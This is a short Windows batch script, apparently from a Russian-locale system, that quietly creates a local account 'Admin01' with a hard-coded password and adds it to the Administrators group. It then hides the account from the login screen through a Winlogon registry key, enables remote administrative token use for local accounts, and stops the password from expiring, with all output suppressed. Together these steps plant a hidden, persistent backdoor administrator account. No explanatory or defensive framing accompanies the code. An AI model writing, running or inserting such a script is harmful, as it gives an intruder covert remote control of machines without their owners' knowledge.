REM Code-page:866
@net user Admin01 P@s$wOrD1 /ADD>nul 2>&1
@net localgroup "Администраторы" Admin01 /ADD>nul 2>&1
@reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Admin01 /t REG_DWORD /d 0 /f>nul 2>&1
@reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f>nul 2>&1
@wmic useraccount where "name='Admin01'" set passwordexpires=false
